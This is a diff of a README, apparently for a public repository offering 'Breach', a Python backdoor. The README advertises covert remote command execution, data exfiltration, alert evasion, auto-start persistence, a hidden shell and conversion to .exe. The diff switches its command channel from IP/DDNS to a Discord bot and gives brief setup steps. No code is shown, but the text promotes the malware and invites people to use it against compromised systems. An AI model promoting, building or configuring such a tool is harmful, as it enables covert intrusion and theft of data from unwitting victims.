@@ -7,6 +7,7 @@
 <strong>
 Breach is a silent Python-based backdoor crafted for stealth and persistence. Designed to run unobtrusively in the background, it establishes a hidden channel to receive remote commands and exfiltrate sensitive data. Leveraging encrypted communications and system-native techniques, Breach maintains access without triggering alerts. Its lightweight footprint and modular design allow seamless integration into compromised systems, ensuring long-term control and invisibility. You can give me a STAR ⭐ if you like my project.
 To use it you have to download all requierement with the install.bat file and then start the build.py file. 
+The old version technically works, but you would have to set up a DDNS, so you should use the new version with the Discord bot.
 </strong>
 </p>
 <br>
@@ -26,7 +27,8 @@ To use it you have to download all requierement with the install.bat file and th
 <br><br>
 <strong>
 * Easy and fast to use
-* Send to any CMD with IP
+* Send to any CMD with Discord BOT
+* Auto Start
 * Hidden shell
 * Convert to a .exe file
 * Beautiful 🙃
